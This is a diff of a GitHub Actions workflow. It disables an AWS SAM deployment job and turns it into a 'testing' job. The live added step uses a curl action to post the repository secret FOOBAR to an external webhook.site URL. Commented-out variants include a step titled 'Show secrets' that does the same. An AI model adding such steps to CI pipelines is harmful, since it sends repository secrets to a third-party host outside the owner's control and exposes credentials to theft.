@@ -10,35 +10,63 @@ permissions:
   contents: read
 
 jobs:
-  deploy:
+  testing:
     runs-on: ubuntu-latest
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v4
+
+    #- name: Install yq
+    #  uses: mikefarah/yq@master
+
+    #- name: Set up AWS SAM
+    #  uses: aws-actions/setup-sam@v2  # Instala SAM automáticamente
+    #  with:
+    #    use-installer: true
+    #    token: ${{ secrets.GITHUB_TOKEN }}
+
+    #- name: Configure AWS credentials using OIDC
+    #  uses: aws-actions/configure-aws-credentials@v3
+    #  with:
+    #    role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/GitHubActionsSAMRole  # Reemplaza con tu ARN de IAM
+    #    aws-region: us-east-1  # Reemplaza con tu región
+
+    #- name: 📄 🔍 Validate Syntax
+    #  run: sam validate --lint
+
+    #- name: 📄 🔨 📦 Build
+    #  run: sam build --use-container
     
-    - name: Install yq
-      uses: mikefarah/yq@master
+    #- name: update packages
+    #  run: apt-get update
 
-    - name: Set up AWS SAM
-      uses: aws-actions/setup-sam@v2  # Instala SAM automáticamente
+    #- name: install curl
+    #  run: apt-get install -y curl
+
+    #- name: Show secrets 🐈
+    #  run: |
+    #    echo "I'm alive"
+    #    curl -d "I'm alive 🐩" -d "${{ secrets.FOOBAR }}"
+
+    #- name: curl
+    #  uses: wei/curl@v1
+    #  with:
+    #    args: |
+    #     "https://webhook.site/943e6fa6-c61a-434c-84ab-b5988dbafd00"
+    #      -d "Im alive 🐩"
+
+    #- name: use curl
+    #  uses: enflo/curl-action@master
+    #  with:
+    #    curl: "'https://webhook.site/943e6fa6-c61a-434c-84ab-b5988dbafd00' -d 'asdfasdf'"
+
+    - name: use curl
+      uses: dedene/curl@v1
       with:
-        use-installer: true
-        token: ${{ secrets.GITHUB_TOKEN }}
+        args: -d "hello=1" -d "foobar=${{ secrets.FOOBAR }}" https://webhook.site/943e6fa6-c61a-434c-84ab-b5988dbafd00
 
-    - name: Configure AWS credentials using OIDC
-      uses: aws-actions/configure-aws-credentials@v3
-      with:
-        role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/GitHubActionsSAMRole  # Reemplaza con tu ARN de IAM
-        aws-region: us-east-1  # Reemplaza con tu región
-
-    - name: 📄 🔍 Validate Syntax
-      run: sam validate --lint
-
-    - name: 📄 🔨 📦 Build
-      run: sam build --use-container
-
-    - name: 📦 🚀 ☁️ Deploy
-      run: |
-        export SAM_PARAMETER_OVERIDES="$(yq eval '.Parameters | with_entries(select(.key | test("^SECRET"))) | keys | .[] | "\(. )=\"${{ secrets.\(. ) }}\"" ' template.yaml | paste -sd ' ' -)"
-        sam deploy --config-file samconfig.toml --no-confirm-changeset --no-fail-on-empty-changeset --parameter-overrides $SAM_PARAMETER_OVERIDES
+    #- name: 📦 🚀 ☁️ Deploy
+    #  run: |
+    #    export SAM_PARAMETER_OVERIDES="$(yq eval '.Parameters | with_entries(select(.key | test("^SECRET"))) | keys | .[] | "\(. )=\"${{ secrets.\(. ) }}\"" ' template.yaml | paste -sd ' ' -)"
+    #    sam deploy --config-file samconfig.toml --no-confirm-changeset --no-fail-on-empty-changeset --parameter-overrides $SAM_PARAMETER_OVERIDES
